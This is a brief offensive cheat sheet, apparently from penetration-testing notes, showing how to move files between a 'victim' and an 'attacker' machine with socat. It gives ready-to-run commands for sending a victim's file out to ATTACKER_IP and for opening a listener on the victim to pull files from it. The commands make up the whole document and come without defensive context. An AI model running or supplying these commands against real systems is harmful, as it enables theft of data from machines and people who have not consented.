# Socat

### 1) From victim to attacker

Start a listener on the attacker's machine

    socat TCP4-LISTEN:PORT,fork file:/tmp/output.txt,create

Transfer the file to the attacker's machine

    socat TCP4:ATTACKER_IP:PORT file:/home/user/file.txt

### 2) From attacker to victim

Start a listener on the victim's machine

    socat TCP4-LISTEN:PORT,fork file:/home/user/file.txt

Connect with attacker machine to receive file

    socat TCP4:VICTIM_IP:PORT file:/tmp/output.txt,create
